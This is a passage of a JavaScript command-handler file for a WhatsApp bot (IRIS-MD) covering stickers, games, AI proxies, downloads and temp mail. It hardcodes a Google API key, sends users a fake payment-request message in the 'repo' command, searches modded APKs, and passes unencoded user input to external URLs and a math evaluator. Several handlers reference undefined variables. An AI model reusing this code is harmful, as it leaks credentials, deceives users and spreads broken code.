    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
    if (!/webp/.test(mime)) return irisreply(`Reply sticker with caption *${prefix + command}*`);
    irisreply(mess.wait);
    let media = await Venox.downloadAndSaveMediaMessage(qmsg);
    let webpToMp4 = await webp2mp4File(media);
    await Venox.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m });
    await fs.unlinkSync(media);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'tourl': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
    
    irisreply(mess.wait);
    let media = await Venox.downloadAndSaveMediaMessage(qmsg);
    let anu;
    if (/image/.test(mime)) {
        anu = await TelegraPh(media);
    } else {
        anu = await UploadFileUgu(media);
    }
    irisreply(util.format(anu));
    await fs.unlinkSync(media);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'emojimix': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);

    let [emoji1, emoji2] = text.split`+`;
    if (!emoji1) return irisreply(`Example : ${prefix + command} 😅+🤔`);
    if (!emoji2) return irisreply(`Example : ${prefix + command} 😅+🤔`);
    irisreply(mess.wait);
    let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`);
    for (let res of anu.results) {
        let encmedia = await Venox.sendImageAsSticker(m.chat, res.url, m, {
            packname: global.packname,
            author: global.author,
            categories: res.tags
        });
        await fs.unlinkSync(encmedia);
    }
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'vv':
case 'toviewonce': {
    if (isBan || isBanChat) return irisreply(isBan ? mess.banned : mess.bangc);
    
    if (!quoted) return irisreply(`Reply Image/Video`);
    let type = /image/.test(mime) ? 'image' : (/video/.test(mime) ? 'video' : '');
    if (type) {
        let media = await Venox.downloadAndSaveMediaMessage(quoted);
        Venox.sendMessage(m.chat, { [type]: { url: media }, caption: `Here you go!`, fileLength: type === 'image' ? '999' : '99999999', viewOnce: true }, { quoted: m });
        await fs.unlinkSync(media);
    }
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'toqr': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    
    if (!q) return irisreply('Please include link or text!');
    
    const QrCode = require('qrcode-reader');
    const qrcode = require('qrcode');
    
    let qyuer = await qrcode.toDataURL(q, { scale: 35 });
    let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64');
    let buff = getRandom('.jpg');
    await fs.writeFileSync('./' + buff, data);
    let medi = fs.readFileSync('./' + buff);
    
    Venox.sendMessage(from, { image: medi, caption: "Here you go!" }, { quoted: m });
    
    setTimeout(() => {
        fs.unlinkSync(buff);
    }, 10000);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'fliptext': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);

    if (args.length < 1) return irisreply(`Example:\n${prefix}fliptext Venoxsama`);
    
    quere = args.join(" ");
    flipe = quere.split('').reverse().join('');
    irisreply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'listvn': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);

    let teks = '┌──⭓「 *List Vn* 」\n│\n';
    for (let x of VoiceNoteVenox) {
        teks += `│⭔ ${x}\n`;
    }
    teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteVenox.length}*`;
    irisreply(teks);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'liststicker': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);

    let teks = '┌──⭓「 *List Sticker* 」\n│\n';
    for (let x of StickerVenox) {
        teks += `│⭔ ${x}\n`;
    }
    teks += `│\n└────────────⭓\n\n*Total : ${StickerVenox.length}*`;
    irisreply(teks);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'listimage': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);

    let teks = '┌──⭓「 *List Image* 」\n│\n';
    for (let x of ImageVenox) {
        teks += `│⭔ ${x}\n`;
    }
    teks += `│\n└────────────⭓\n\n*Total : ${ImageVenox.length}*`;
    irisreply(teks);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'listvideo': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);

    let teks = '┌──⭓「 *List Video* 」\n│\n';
    for (let x of VideoVenox) {
        teks += `│⭔ ${x}\n`;
    }
    teks += `│\n└────────────⭓\n\n*Total : ${VideoVenox.length}*`;
    irisreply(teks);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'afk': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    
    if (!m.isGroup) return irisreply(mess.group);
    if (isAfkOn) return irisreply("Already afk");
    
    let reason = text ? text : 'Nothing.';
    afk.addAfkUser(m.sender, Date.now(), reason, _afk);
    irisreply(`@${m.sender.split('@')[0]} Currently AFK\nWith reason: ${reason}`);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'myip':
case 'ipbot': {

    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    if (!isCreator) return irisreply(mess.owner);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    var http = require("http");
    http.get(
        {
            host: "api.ipify.org",
            port: 80,
            path: "/",
        },
        function (resp) {
            resp.on("data", function (ip) {
                irisreply("🔎 My public IP address is: " + ip);
            });
        }
    );
    }
    break;
	    
//----------------------------------------------------------------------------------
	    
case 'repo':
case 'repository': {
    try {
        const [, username, repoName] = botscript.match(
            /github\.com\/([^/]+)\/([^/]+)/
        );
        const response = await axios.get(
            `https://api.github.com/repos/V-E-N-O-X/IRIS-MD`
        );
        if (response.status === 200) {
            const repoData = response.data;
            const formattedInfo = `
🔎 *Repository Information:*
📚 *Name:* ${repoData.name}
📝 *Description:* ${repoData.description}
👤 *Owner:* ${repoData.owner.login}
⭐ *Stars:* ${repoData.stargazers_count}
🍴 *Forks:* ${repoData.forks_count}

🔗 [GitHub Repository](${repoData.html_url})
`.trim();

            const message = { text: formattedInfo, parse_mode: "Markdown", requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 69000, requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: "Payment requested for repository information.", contextInfo: { externalAdReply: { showAdAttribution: true, }, }, }, }, }, };

            await Venox.relayMessage(m.chat, message);
        } else {
            await Venox.relayMessage(m.chat, { text: `Unable to fetch repository information` });
        }
    } catch (error) {
        console.error(error);
        await Venox.relayMessage(m.chat, { text: `Repository currently not available` });
    }
    break;
}
	    
//----------------------------------------------------------------------------------
	    
case 'sc':
case 'script':
case 'scriptbot':
    if (isBan) return Venox.reply(mess.banned);
    if (isBanChat) return Venox.reply(mess.bangc);
    const githubRepoUrl = 'https://api.github.com/repos/V-E-N-O-X/IRIS-MD';

    axios.get(githubRepoUrl)
        .then(response => response.data)
        .then(data => {
            const repoInfo = {
                stars: data.stargazers_count,
                forks: data.forks_count,
                lastUpdate: data.updated_at,
                owner: data.owner.login
            };

            // Format the date
            const releaseDate = new Date(data.created_at).toLocaleDateString('en-GB');
            const lastUpdateDate = new Date(repoInfo.lastUpdate).toLocaleDateString('en-GB');

            const formattedInfo = `*GitHub Repository:* ${data.html_url}
⭐ *Stars:* ${repoInfo.stars}
♈ *Forks:* ${repoInfo.forks}
📅 *Release Date:* ${releaseDate}
🕐 *Last Update:* ${lastUpdateDate}
👨‍💻 *Owner:* ${repoInfo.owner}`;

            Venox.reply(formattedInfo);
            Venox.sendPoll(m.chat, uy, [`${prefix}help`, `${prefix}myip`], {
                quoted: m
            });
        })
        .catch(error => {
            console.error('Error fetching GitHub repository info:', error);
            Venox.reply('An error occurred while fetching repository information');
        });

    break;
	    
//----------------------------------------------------------------------------------
case 'server':
case 'sysinfo': {
    if (isBan) return Venox.reply(mess.banned);
    if (isBanChat) return Venox.reply(mess.bangc);
    const used = process.memoryUsage();
    const cpu = os.cpus()[0];
    const totalCpuUsage = ((1 - cpu.times.idle / (cpu.times.user + cpu.times.nice + cpu.times.sys + cpu.times.idle)) * 100).toFixed(2);
    const systemName = `${os.platform()} ${os.release()}`;
    const totalMemory = formatBytes(os.totalmem());
    const usedMemory = formatBytes(used.rss);
    const nodeMemoryUsage = Object.entries(used).map(([key, value]) => `${key}: ${formatBytes(value)}`).join(', ');
    const cpuModel = `${cpu.model.trim()} (${cpu.speed} MHz)`;
    const uptime = secondsToDhms(process.uptime());
    const responseSpeed = latensie.toFixed(4);

    const response = `
- *🎌 ɪʀɪs-ᴍᴅ sᴇʀᴠᴇʀ ɪɴꜰᴏ 🎌* -

- *sʏsᴛᴇᴍ*-
${systemName}

- *ʀᴀᴍ*-
${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

- *ᴍᴇᴍᴏʀʏ*-
${Object.keys(used).map(key => `${key}: ${formatp(used[key])}`).join(', ')}

- *ᴄᴘᴜ*-
${totalCpuUsage}%

- *ᴄᴘᴜ ᴍᴏᴅᴇʟ*-
${cpu.model.trim()} (${cpu.speed} MHz)

- *ʀᴜɴᴛɪᴍᴇ*-
${runtime(process.uptime())}
`.trim();

    irisreply(response);
    break;
}
	    
//----------------------------------------------------------------------------------
	    
case 'ban': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    if (!isCreator) return irisreply(mess.owner);
    Venox.sendMessage(from, { react: { text: "🫡", key: m.key } });

    if (!args[0]) return irisreply(`Select 'add' or 'del' (add to ban, del to unban). For Example: reply *${prefix}ban add* to the user you want to ban.`);
    
    let orgnye;
    if (args[1]) {
        orgnye = args[1] + "@s.whatsapp.net";
    } else if (m.quoted) {
        orgnye = m.quoted.sender;
    } else {
        return irisreply(`Please specify the user to ban.`);
    }
    
    const isBanned = banUser.includes(orgnye);
    
    if (args[0] === "add") {
        if (isBanned) return irisreply('User is already banned.');
        banUser.push(orgnye);
        return irisreply(`Successfully banned the user.`);
    } else if (args[0] === "del") {
        if (!isBanned) return irisreply('User is not banned.');
        const index = banUser.indexOf(orgnye);
        banUser.splice(index, 1);
        return irisreply(`Successfully unbanned the user.`);
    } else {
        return irisreply("Invalid command. Use 'add' or 'del'.");
    }
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'ttc':
case 'ttt':
case 'tictactoe': {
    if (isBan) return Venox.sendMessage(from, mess.banned);
    if (isBanChat) return Venox.sendMessage(from, mess.bangc);
    Venox.sendMessage(from, { react: { text: "🎮", key: m.key } });

    let TicTacToe = require("./lib/tictactoe");
    this.game = this.game ? this.game : {};

    const playerInGame = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender));
    if (playerInGame) return Venox.sendMessage(from, `${pushname} You are still in a game...`);

    let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true));
    if (room) {
        Venox.sendMessage(from, `Hey ${pushname}, your partner is found!`);
        room.o = m.chat;
        room.game.playerO = m.sender;
        room.state = 'PLAYING';
        let arr = room.game.render().map(v => {
            return {
                X: '❌',
                O: '⭕',
                1: '1️⃣',
                2: '2️⃣',
                3: '3️⃣',
                4: '4️⃣',
                5: '5️⃣',
                6: '6️⃣',
                7: '7️⃣',
                8: '8️⃣',
                9: '9️⃣',
            }[v]
        });
        let str = `Room ID: ${room.id}\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\nWaiting @${room.game.currentTurn.split('@')[0]}\nType *surrender* to surrender and admit defeat...`;

        if (room.x !== room.o) {
            await Venox.sendMessage(room.x, str, m, { mentions: parseMention(str) });
        }
        await Venox.sendMessage(room.o, str, m, { mentions: parseMention(str) });
    } else {
        room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
        };
        if (text) room.name = text;
        Venox.sendMessage(from, `Waiting for partner...${text ? ` Type the command below: ${prefix} ${command} ${text}` : ''}`);
        this.game[room.id] = room;
    }
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'report':
case 'suggest': {
    if (isBan) return Venox.sendMessage(from, mess.banned);
    if (isBanChat) return Venox.sendMessage(from, mess.bangc);
    if (!text) return Venox.sendMessage(from, `Please provide a report message.`);
    if (text.length > 300) return Venox.sendMessage(from, `The report message should not exceed 300 characters.`);

    const senderLink = `wa.me/${m.sender.split("@")[0]}`;
    const groupName = conn.getName(m.chat);
    const reportMessage = `*📮 Report Message*\n\n*Sender ➛* ${senderLink}\n\n*Group Name ➛* ${groupName}\n\n*Message ➛* ${text}`;

    for (let mod of global.Owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != '8801853262586@s.whatsapp.net')) {
        await Venox.sendMessage(mod, { text: reportMessage }, { quoted: m });
    }

    await Venox.sendMessage('@g.us', { text: reportMessage, mentions: groupAdmins }, { quoted: m });

    irisreply(`*✅ Your report has been submitted successfully to the support group & owner.*\n\n*You will get a response shortly... ♥️*`);
    break;
}
	    
//----------------------------------------------------------------------------------
	    
case 'dice':
case 'roll': {
    if (isBan) return Venox.sendMessage(from, mess.banned);
    if (isBanChat) return Venox.sendMessage(from, mess.bangc);
    Venox.sendMessage(from, { react: { text: "🎲", key: m.key } });
    const result = Math.floor(Math.random() * 6) + 1;
    const diceMessage = `🎲 *Dice Roll Result:* ${result}`;
    irisreply(diceMessage);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'flipcoin':
case 'coin': {
    if (isBan) return Venox.sendMessage(from, mess.banned);
    if (isBanChat) return Venox.sendMessage(from, mess.bangc);
    Venox.sendMessage(from, { react: { text: "🪙", key: m.key } });
    const result = Math.random() < 0.5 ? 'Heads' : 'Tails';
    const flipCoinMessage = `🪙 *Coin Flip Result: ${result}*`;
    irisreply(flipCoinMessage);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'rps': {
    if (isBan) return Venox.sendMessage(from, mess.banned);
    if (isBanChat) return Venox.sendMessage(from, mess.bangc);
    const randomEmoji = manyemojis[Math.floor(Math.random() * manyemojis.length)];
    Venox.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
    const validMoves = ['rock', 'paper', 'scissors'];
    if (!args[0] || !validMoves.includes(args[0].toLowerCase())) {
        return irisreply('Please provide a valid move: rock, paper, or scissors. 🪨 📄 ✂️');
    }
    const botMove = validMoves[Math.floor(Math.random() * validMoves.length)];
    const userMove = args[0].toLowerCase();
    let result;
    if (userMove === botMove) {
        result = 'It\'s a tie! 🤝';
    } else if (
        (userMove === 'rock' && botMove === 'scissors') ||
        (userMove === 'paper' && botMove === 'rock') ||
        (userMove === 'scissors' && botMove === 'paper')
    ) {
        result = `You win! 🥳 ${userMove} beats ${botMove}.`;
    } else {
        result = `You lose! 😞 ${botMove} beats ${userMove}.`;
    }
    irisreply(`You chose ${userMove}. IrisBot chose ${botMove}. ${result}`);
}
break;
	    
//----------------------------------------------------------------------------------
case 'listonline': case 'listaktif': case 'here': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.group);
        Venox.sendMessage(from, { react: { text: "🫡", key: m.key } })

        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
        let online = [...Object.keys(store.presences[id]), botNumber]
        let liston = 1
        Venox.sendText(m.chat, '  「 *Online Members* 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
      }
        break;  
//----------------------------------------------------------------------------------
case 'happymod': case 'modapk': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Venox.sendMessage(from, { react: { text: "🔍", key: m.key } });

        if (!args.join(" ")) return reply(`Example: ${prefix + command} Kinemaster`);

        const searchTerm = args.join(" ");
        modapk.happymod(searchTerm).then(async (res) => {
          let teks = '```「 HappyMod Search Engine 」```';
          for (let i of res) {
            teks += `\n\n${i.name}\n`;
            teks += `${i.link}`;
          }

          let messageToSend = teks;
          if (res[0].icon) {
            messageToSend = {
              text: teks,
              image: { url: res[0].icon },
              jpegThumbnail: Thumb,
            };
          }

          Venox.sendMessage(from, messageToSend, { quoted: m });
        });
      }
        break;
//----------------------------------------------------------------------------------
case 'tagadmins': case 'admins': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.group);
        Venox.sendMessage(from, { react: { text: "🗿", key: m.key } })

        if (!text) return reply(`*Please quote or write a meaningful message to tag admins to*`)
        let teks = `*「 Tag Admins 」*

*Message : ${text}*\n\n`
        for (let mem of groupAdmins) {
          teks += `🍁 @${mem.split('@')[0]}\n`
        }
        Venox.sendMessage(m.chat, { text: teks, mentions: groupAdmins }, { quoted: m })
      }
        break;
//----------------------------------------------------------------------------------
case 'calculator': case 'cal': case 'calculate': {
        if (isBan) return irisreply(mess.banned);
        if (isBanChat) return irisreply(mess.bangc);
        if (args.length < 1) return irisreply(`*Example :*\n${prefix}calculator 2*5\n\n`)
        let qsd = args.join(" ")
        if (typeof mathjs.evaluate(qsd) !== 'number') {
          reply('Error')
        } else {
          reply(`\`\`\`「 _Calculator Tool_ 」\`\`\`\n\n*Input :* ${qsd}\n*Calculation Result :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
        }
      }
        break;
//----------------------------------------------------------------------------------
case 'translate': case 'ts': case 'trans': {
        if (isBan) return irisreply(mess.banned);
        Venox.sendMessage(from, { react: { text: "⌛", key: m.key } })

        if (!args.join(" ")) return reply("Pls enter any text to translate")
        tes = await fetchJson(`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
        Infoo = tes.info
        Detek = tes.translate
        reply(`Input : ${Detek}\nTranslation Results : ${Infoo}`)
      }
        break;
//----------------------------------------------------------------------------------
 case 'gimage':
      case 'image':
      case 'googleimage': {
        if (isBan) return irisreply(mess.banned);
        if (isBanChat) return irisreply(mess.bangc);
        Venox.sendMessage(from, { react: { text: "⌛", key: m.key } });

        if (!args[0]) return reply("Enter a search term to get Google Image!");
        let gis = require('g-i-s');
        gis(args.join(" "), async (error, result) => {
          if (error) {
            console.error(error);
            return reply("Error occurred while searching for images.");
          }

          if (!result || result.length === 0) {
            return reply("No images found for the given search term.");
          }

          n = result;
          images = n[Math.floor(Math.random() * n.length)].url;
          let buttonMessage = {
            image: { url: images },
            caption: `「 _Google Image Search_ 」\n\n_Search Term_ : ${text}\n_Media Url_ : ${images}`,
            footer: `${global.BotName}`,
            headerType: 4,
          };
          Venox.sendMessage(m.chat, buttonMessage, { quoted: m });
        });
      }
        break;
//----------------------------------------------------------------------------------
case 'qt':
  try {
    if (!args[0] && !m.quoted) return m.reply(`Please provide a text (Type or mention a message) !`);
    
    const userPfp = m.quoted ? await Venox.profilePictureUrl(m.quoted.sender, "image") : await Venox.profilePictureUrl(m.sender, "image");
    const waUserName = pushname || "Unknown";
    const quoteText = m.quoted ? m.quoted.body : args.join(" ");
    const quoteJson = { type: "quote", format: "png", backgroundColor: "#FFFFFF", width: 700, height: 580, scale: 2, messages: [{ entities: [], avatar: true, from: { id: 1, name: waUserName, photo: { url: userPfp } }, text: quoteText, replyMessage: {} }] };
    const quoteResponse = await axios.post("https://bot.lyo.su/quote/generate", quoteJson, { headers: { "Content-Type": "application/json" } });
    const buffer = Buffer.from(quoteResponse.data.result.image, "base64");
    Venox.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.botname}`, author: waUserName });
  } catch (error) { console.error(error); irisreply("Error generating quote!"); }
  break;
//----------------------------------------------------------------------------------
case 'daily':
case 'claim':
case 'reward': {
  if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender);
  if (isBan) return reply(mess.banned);
  if (isBanChat) return irisreply(mess.bangc);
  if (!m.isGroup) return irisreply(mess.group);

  Venox.sendMessage(from, { react: { text: "💰", key: m.key } });

  const user = m.sender;
  const cara = "cara";
  const daily = await eco.daily(user, cara, 999);

  if (daily.cd) return irisreply(`You already claimed daily for today, come back in ${daily.cdL}`);

  irisreply(`You claimed 💎${daily.amount} for daily`);
  break;
}
//----------------------------------------------------------------------------------
case 'film': case 'movie': case 'moviesearch':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        reply(mess.wait)
        if (!q) return reply(`Please enter a Movie search term...\nExample: ${prefix}movie Spiderman`)
        xfarrapi.Film(q)
          .then(data => {
            console.log(data)
            let krl = `*Search Term:* ${q}\n\n`
            for (let i of data) {
              krl += (`${prefix}----------------------------------------------------------------------------\n\n\n*Movie Name:* ${i.judul}\n *Quality :* ${i.quality}\n *Type : ${i.type}*\n *Uploaded on :* ${i.upload}\n *Source URL :* ${i.link}\n\n\n`)
            }
            Venox.sendMessage(from, { image: { url: data[0].thumb }, caption: krl }, { quoted: fdocs })
          });
        break;
//----------------------------------------------------------------------------------
case 'wallpaper':
      case 'animewallpaper':
      case 'animewall': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        reply(mess.wait);
        Venox.sendMessage(from, { react: { text: "🥵", key: m.key } });
        if (!args.join(" ")) return reply("Please enter a term to search!");

        const { AnimeWallpaper } = require("anime-wallpaper");
        const wall = new AnimeWallpaper();
        const pages = [1, 2, 3, 4];
        const random = pages[Math.floor(Math.random() * pages.length)];
        const wallpapers = await wall.getAnimeWall4({ title: q, type: "sfw", page: pages }).catch(() => null);

        const maxImagesToSend = 15;
        const minImagesToSend = 5;
        const imagesToSend = Math.min(maxImagesToSend, Math.max(minImagesToSend, wallpapers.length));

        for (let i = 0; i < imagesToSend; i++) {
          let message = {
            image: { url: wallpapers[i].image },
            footer: `${botname}`,
            headerType: 4
          };
          Venox.sendMessage(m.chat, message, { quoted: m });
        }
      }
      break;
//----------------------------------------------------------------------------------
case 'animestory': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        reply(mess.wait)
        await fetchJson(`https://api.jikan.moe/v4/anime?q=${q}`)
          .then((res) => {
            console.log(res)
            let sections = []
            for (let i of res.data) {
              const list = {
                title: `${i.title}`,
                rows: [
                  {
                    title: `${i.title}\n\n`,
                    rowId: `${prefix}animesearch ${i.mal_id}`,
                    description: `${i.synopsis}`
                  },
                ]
              }
              sections.push(list)
            }
            const sendm = Venox.sendMessage(
              from,
              {
                text: "Anime Search",
                footer: botname,
                title: ownername,
                buttonText: "Search Results",
                sections
              }, { quoted: m }
            )
          })
      }
        break;
//----------------------------------------------------------------------------------
case "mathsai":
case "mathai":
        {
	  if (isBan) return reply(mess.banned);
          if (isBanChat) return reply(mess.bangc);
          if (!text) return irisreply("What is your question?");
          let d = await fetchJson(
            `https://api.maher-zubair.tech/ai/mathssolve?q=${text}`
          );
          if (!d.result) {
            return irisreply(
              "Failed to get response. Please try again later"
            );
          } else {
            irisreply(d.result);
          }
        }
        break;
//----------------------------------------------------------------------------------
case "bard":
case "bardai":
        {
	  if (isBan) return reply(mess.banned);
          if (isBanChat) return reply(mess.bangc);
          if (!text) return irisreply("What is your question?");
          let d = await fetchJson(
            `https://api.maher-zubair.tech/ai/bard?q=${text}`
          );
          if (!d.result) {
            return irisreply(
              "Failed to get response. Please try again later"
            );
          } else {
            irisreply(d.result);
          }
        }
        break;
//----------------------------------------------------------------------------------
case "blackbox":
case "blackboxai":
        {
	  if (isBan) return reply(mess.banned);
          if (isBanChat) return reply(mess.bangc);
          if (!text) return irisreply("What is your question?");
          let d = await fetchJson(
            `https://api.maher-zubair.tech/ai/blackboxv4?q=${text}`
          );
          if (!d.result) {
            return irisreply(
              "Failed to get response. Please try again later"
            );
          } else {
            irisreply(d.result);
          }
        }
        break;
//----------------------------------------------------------------------------------
case "photoleap":
case "photoleapai":
        {
	  if (isBan) return reply(mess.banned);
          if (isBanChat) return reply(mess.bangc);
          if (!text) return irisreply("What is your question?");
          let d = await fetchJson(
            `https://api.maher-zubair.tech/ai/photoleap?q=${text}`
          );
          Venox.sendMessage(
            from,
            { image: { url: venoxfetch.result } },
            { quoted: m }
          );
        }
        break;
//----------------------------------------------------------------------------------
case "llamaai":
case "llama":
        {
	  if (isBan) return reply(mess.banned);
          if (isBanChat) return reply(mess.bangc);
          if (!text) return irisreply("What is your question?");
          let d = await fetchJson(
            `https://api.maher-zubair.tech/ai/llama-2?q=${text}`
          );
          if (!d.result) {
            return irisreply(
              "Failed to get response. Please try again later"
            );
          } else {
            irisreply(d.result);
          }
        }
        break;
//----------------------------------------------------------------------------------
case "gemini":
case "geminiai":
        {
	  if (isBan) return reply(mess.banned);
          if (isBanChat) return reply(mess.bangc);
          if (!text) return irisreply("What is your question?");
          let d = await fetchJson(
            `https://api.maher-zubair.tech/ai/gemini?q=${text}`
          );
          if (!d.result) {
            return irisreply(
              "Failed to get response. Please try again later"
            );
          } else {
            irisreply(d.result);
          }
        }
        break;
//----------------------------------------------------------------------------------
case "gpt":
case "chatgpt":
        {
	  if (isBan) return reply(mess.banned);
          if (isBanChat) return reply(mess.bangc);
          if (!text) return irisreply("What is your question?");
          let d = await fetchJson(
            `https://api.maher-zubair.tech/ai/chatgptv4?q=${text}`
          );
          if (!d.result) {
            return irisreply(
              "Failed to get response. Please try again later"
            );
          } else {
            irisreply(d.result);
          }
        }
        break;
//----------------------------------------------------------------------------------
 case "tempinbox":
 case "tib":
        {
	  if (isBan) return reply(mess.banned);
          if (isBanChat) return reply(mess.bangc);
          if (!args[0]) {
            return irisreply(
              `Specify valid temp mail ID. Type ${prefix}tempmail to generate one...`
            );
          }
          async function getInboxData(qParam) {
            try {
              const response = await fetch(
                `https://api.maher-zubair.tech/misc/get_inbox_tempmail?q=${qParam}`
              );
              const data = await response.json();
              return data;
            } catch (error) {
              return irisreply(`API is currently down. Try again later...`);
            }
          }
          getInboxData(args[0]).then((data) => {
            console.log(data);
            if (!data.result) {
              return irisreply("Invalid ID. Enter correct Temp Mail ID.");
            }
            if (data.result[1] == 0) {
              return irisreply("Your Inbox is Empty...");
            }
            const emails = data.result[0];
            let outputMessage = "INBOX:\n";
            emails.forEach((email, index) => {
              outputMessage += `\n*Email ${index + 1}:*\n`;
              outputMessage += `* From: ${email.fromAddr}\n`;
              outputMessage += `* To: ${email.toAddr}\n`;
              outputMessage += `* Subject: ${email.headerSubject}\n`;
              outputMessage += `* Text: ${email.text}\n`;
              outputMessage += `* Download: ${email.downloadUrl}\n`;
            });
            irisreply(outputMessage);
          });
        }
        break;
//----------------------------------------------------------------------------------
case "enhance":
        {
	  if (isBan) return reply(mess.banned);
          if (isBanChat) return reply(mess.bangc);
          if (!isMedia) return irisreply("Where Is The Image");
          let media = await Venox.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          Venox.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api.maher-zubair.tech/maker/enhance?url=${anu}`,
              },
              caption: "ⁱʳⁱˢ ᵇᵃⁱˡᵉʸˢ ᵐᵈ",
            },
            { quoted: m }
          );
        }
        break;
//----------------------------------------------------------------------------------
      case "dehaze":
        {
	  if (isBan) return reply(mess.banned);
          if (isBanChat) return reply(mess.bangc);
          if (!isMedia) return irisreply("Where Is The Image");
          let media = await Venox.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          Venox.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api.maher-zubair.tech/maker/dehaze?url=${anu}`,
              },
              caption: "ⁱʳⁱˢ ᵇᵃⁱˡᵉʸˢ ᵐᵈ",
            },
            { quoted: m }
          );
        }
        break;
//----------------------------------------------------------------------------------
case 'play':
case 'song': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    if (!text) return replygcxeon(`Example : ${prefix + command} okkasan`);
    const irismp3 = require('./lib/ytdl2');
    const yts = require("youtube-yts");
    const search = await yts(text);
    const anup3k = search.videos[0];
    const pl = await irismp3.mp3(anup3k.url);
    await Venox.sendMessage(m.chat, {
        audio: fs.readFileSync(pl.path),
        fileName: anup3k.title + '.mp3',
        mimetype: 'audio/mp4',
        ptt: true,
        contextInfo: { externalAdReply: { title: anup3k.title, body: botname, thumbnail: await fetchBuffer(pl.meta.image), mediaType: 2, mediaUrl: anup3k.url } }
    }, { quoted: m });
    await fs.unlinkSync(pl.path);
}
break;
//----------------------------------------------------------------------------------
case "ytmp3":
case "ytaudio": {
    const audp3 = require('./lib/ytdl2');
    if (args.length < 1 || !isUrl(text) || !audp3.isYTUrl(text)) return irisreply(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`);
    
    const audio = await audp3.mp3(text);
    
    await Venox.sendMessage(m.chat, { audio: fs.readFileSync(audio.path), mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply: { title: audio.meta.title, body: botname, thumbnail: await fetchBuffer(audio.meta.image), mediaType: 2, mediaUrl: text } } }, { quoted: m });
    await fs.unlinkSync(audio.path);
}
break;
//----------------------------------------------------------------------------------
case 'ig': {
  if (isBan) return reply(mess.banned);
  if (isBanChat) return reply(mess.bangc);
  if (args[0] === "mp4") {
    Venox.sendMessage(from, { video: { url: args[1] }, caption: 'Here it is...', mimetype: 'video/mp4' }, { quoted: m })
